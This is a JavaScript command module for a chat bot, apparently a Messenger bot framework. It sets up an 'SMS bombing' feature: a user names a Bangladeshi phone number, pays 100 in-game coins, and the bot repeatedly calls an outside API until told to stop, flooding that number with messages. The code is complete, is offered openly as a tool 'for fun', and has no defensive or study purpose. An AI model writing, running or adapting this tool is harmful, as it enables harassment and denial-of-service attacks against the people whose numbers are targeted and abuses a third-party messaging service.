const axios = require("axios");
const bombingFlags = {};
const deltaNext = 5;

function expToLevel(exp) {
 return Math.floor((1 + Math.sqrt(1 + 8 * exp / deltaNext)) / 2);
}

module.exports = {
 config: {
  name: "salami",
  version: "2.2",
  author: "BaYjid",
  countDown: 0,
  role: 2,
  shortDescription: {
   en: "Send SMS bomb"
  },
  description: {
   en: "Starts SMS bombing on a number for fun (cost: 100 coins)"
  },
  category: "tools",
  guide: {
   en: "sms 01xxxxxxxxx or sms off"
  }
 },

 onChat: async function ({ event, message, args, usersData }) {
  const threadID = event.threadID;
  const senderID = event.senderID;
  const input = args.join(" ").trim();

  if (!input.toLowerCase().startsWith("sms")) return;

  const number = input.split(" ")[1];

  // 🧠 Get user info
  const userData = await usersData.get(senderID);
  const exp = userData.exp || 0;
  const balance = userData.money || 0;
  const level = expToLevel(exp);

  // ⛔ Level check
  if (level < 2) {
   return message.reply("🚫 You must be at least level 2 to use this command!");
  }

  // 📴 Stop bombing
  if (number === "off") {
   if (bombingFlags[threadID]) {
    bombingFlags[threadID] = false;
    return message.reply("✅ SMS bombing has been stopped.");
   } else {
    return message.reply("❗There is no active bombing in this thread.");
   }
  }

  // ❌ Invalid number
  if (!/^01[0-9]{9}$/.test(number)) {
   return message.reply(
    "📱 Please provide a valid Bangladeshi number!\n" +
    "👉 Example: sms 01xxxxxxxxx\n\n" +
    "💸 Each bombing costs 100 coins!"
   );
  }

  // 🔁 Already bombing
  if (bombingFlags[threadID]) {
   return message.reply("❗Bombing is already in progress in this thread! To stop, type: sms off");
  }

  // 💸 Balance check
  if (balance < 100) {
   return message.reply(`❌ You don’t have enough coins!\n🔻 Required: 100 coins\n🪙 Your balance: ${balance}`);
  }

  // ✅ Deduct 100 coins
  await usersData.set(senderID, {
   money: balance - 100
  });

  message.reply(`💥 SMS bombing started on number ${number}...\n💸 100 coins have been deducted!\n🛑 To stop, type: sms off`);

  bombingFlags[threadID] = true;

  (async function startBombing() {
   while (bombingFlags[threadID]) {
    try {
     await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
    } catch (err) {
     message.reply(`❌ Error: ${err.message}`);
     bombingFlags[threadID] = false;
     break;
    }
   }
  })();
 },

 onStart: async function () {}
};